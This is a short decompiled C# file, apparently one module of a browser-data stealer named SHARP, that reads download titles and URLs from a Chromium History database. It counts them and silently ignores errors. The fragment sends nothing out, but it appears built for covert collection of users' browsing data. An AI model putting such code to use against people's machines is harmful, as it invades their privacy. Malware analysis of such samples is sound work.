﻿using System;
using System.Collections.Generic;

namespace SHARP.Chromium
{
	// Token: 0x02000083 RID: 131
	internal sealed class Downloads
	{
		// Token: 0x060002BE RID: 702 RVA: 0x00010DFC File Offset: 0x0000EFFC
		public static List<Site> Get(string sHistory)
		{
			List<Site> list = new List<Site>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sHistory, "downloads");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Site item = default(Site);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 17));
					Counting.Downloads++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
